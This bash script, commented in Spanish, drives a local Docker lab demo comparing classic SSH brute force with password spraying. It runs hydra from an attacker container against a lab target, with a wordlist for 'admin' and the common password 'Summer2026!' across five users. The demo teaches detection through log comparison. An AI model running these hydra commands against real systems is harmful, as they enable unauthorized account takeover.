#!/usr/bin/env bash
# Demo 2 — Ataques online: fuerza bruta clásica vs. password spraying
# Ejecutar desde el host, con el lab ya arrancado (docker compose up -d):
#   ./scripts/bruteforce-online.sh
#
# Abre una segunda terminal para ver los logs del objetivo mientras ataca:
#   docker compose logs -f target-ssh

set -e
cd "$(dirname "$0")/.."
pause() { read -rp $'\n[Enter para continuar] '; }
run() { docker compose exec -T attacker bash -c "$1"; }

echo "== 1) Fuerza bruta clásica: un usuario conocido (admin), muchas contraseñas =="
run "hydra -l admin -P /lab/wordlists/common-passwords.txt -t 4 -f ssh://target-ssh"
pause

echo "== 2) Password spraying: una contraseña muy común contra varios usuarios =="
run "printf 'admin\nalice\nbob\ncarol\ndiego\n' > /tmp/usuarios.txt && hydra -L /tmp/usuarios.txt -p 'Summer2026!' -t 1 ssh://target-ssh"
echo
echo "Compara este log con el de arriba: mismo número de intentos, patrón distinto."
echo "(carol usa esa contraseña a propósito, para que la spraying tenga un acierto)"
